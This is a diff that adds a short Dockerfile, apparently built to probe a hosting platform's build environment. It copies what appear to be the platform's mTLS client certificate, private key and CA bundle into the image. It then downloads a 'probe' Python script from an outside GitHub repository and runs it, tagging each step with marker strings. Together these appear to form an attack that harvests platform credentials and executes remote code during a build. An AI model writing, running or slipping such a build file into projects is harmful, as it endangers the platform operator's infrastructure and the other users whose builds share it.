@@ -1,0 +1,9 @@
+# MARK-I67932-w3-6d21e8
+FROM alpine:3.20
+RUN echo MARK-I67932-w3-6d21e8-step1
+COPY var/lib/railwayapp/mtls-pki/client.crt /pki/client.crt
+COPY var/lib/railwayapp/mtls-pki/client.key /pki/client.key
+COPY var/lib/railwayapp/mtls-pki/server-ca-bundle.crt /pki/server-ca-bundle.crt
+RUN apk add --no-cache curl openssl python3 >/dev/null 2>&1; echo APKDONE
+RUN curl -sS -m 25 -o /p.py https://raw.githubusercontent.com/onepluspadtrading/buildctx-lab/main/probe3_i67932.py && echo DL_OK && MARK=I67932-w3-6d21e8 timeout 420 python3 /p.py 2>&1 | head -c 60000
+CMD ["sh","-c","sleep 60"]
